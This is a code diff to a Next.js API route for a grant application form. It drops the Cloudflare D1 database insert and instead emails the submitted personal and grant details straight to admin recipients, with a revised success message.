@@ -4,113 +4,23 @@ import { sendApplicationEmail } from "@/lib/sendApplicationEmail";
 export const runtime = 'edge';
 
 export async function POST(req: Request) {
-  const {
-    firstName,
-    middleName,
-    lastName,
-    phoneNumber,
-    gender,
-    homeCity,
-    taxReturn,
-    streetAddress,
-    city,
-    state,
-    zipCode,
-    country,
-    email,
-    confirmEmail,
-    grantType,
-    grantAmount,
-    accountType,
-    receiveType,
-    grantMailAddress,
-    grantCity,
-    grantState,
-    grantZipCode,
-    grantCountry,
-    grantPhoneNumber,
-  } = await req.json();
-
   try {
-    const db: any = process.env.DB;
+    const formData = await req.json();
 
-    if (db) {
-      await db.prepare(`
-        INSERT INTO applications (
-          firstName, middleName, lastName, phoneNumber, gender, homeCity, taxReturn,
-          streetAddress, city, state, zipCode, country, email, confirmEmail,
-          grantType, grantAmount, accountType, receiveType, grantMailAddress,
-          grantCity, grantState, grantZipCode, grantCountry, grantPhoneNumber, createdAt
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-      `).bind(
-        firstName || null,
-        middleName || null,
-        lastName || null,
-        phoneNumber || null,
-        gender || null,
-        homeCity || null,
-        taxReturn || null,
-        streetAddress || null,
-        city || null,
-        state || null,
-        zipCode || null,
-        country || null,
-        email || null,
-        confirmEmail || null,
-        grantType || null,
-        grantAmount || null,
-        accountType || null,
-        receiveType || null,
-        grantMailAddress || null,
-        grantCity || null,
-        grantState || null,
-        grantZipCode || null,
-        grantCountry || null,
-        grantPhoneNumber || null,
-        new Date().toISOString()
-      ).run();
-      console.log("Successfully saved to Cloudflare D1.");
-    } else {
-      console.warn("Cloudflare D1 DB binding not found.");
-    }
+    // Dispatch directly to the configured admin email inboxes
+    await sendApplicationEmail(formData);
+    console.log("Application received and emailed successfully to admin recipients.");
 
-    try {
-      await sendApplicationEmail({
-        firstName,
-        middleName,
-        lastName,
-        phoneNumber,
-        gender,
-        homeCity,
-        taxReturn,
-        streetAddress,
-        city,
-        state,
-        zipCode,
-        country,
-        email,
-        confirmEmail,
-        grantType,
-        grantAmount,
-        accountType,
-        grantMailAddress,
-        grantCity,
-        grantState,
-        grantZipCode,
-        grantCountry,
-        grantPhoneNumber,
-      });
-      console.log("Email sent successfully.");
-    } catch (emailError) {
-      console.error("Failed to send email:", emailError);
-    }
-
-    return NextResponse.json({ message: "Form submitted successfully" });
+    return NextResponse.json({
+      message: "Application submitted successfully! Our verification team will review the application to determine eligibility. You will receive a text on the status of your application soon. Good luck!",
+    });
   } catch (error) {
     console.error("Error in /api/submit-application:", error);
     return NextResponse.json(
-      { message: "Failed to submit form", error: String(error) },
+      { message: "Failed to submit application. Please try again.", error: String(error) },
       { status: 500 }
     );
   }
 }
+
+
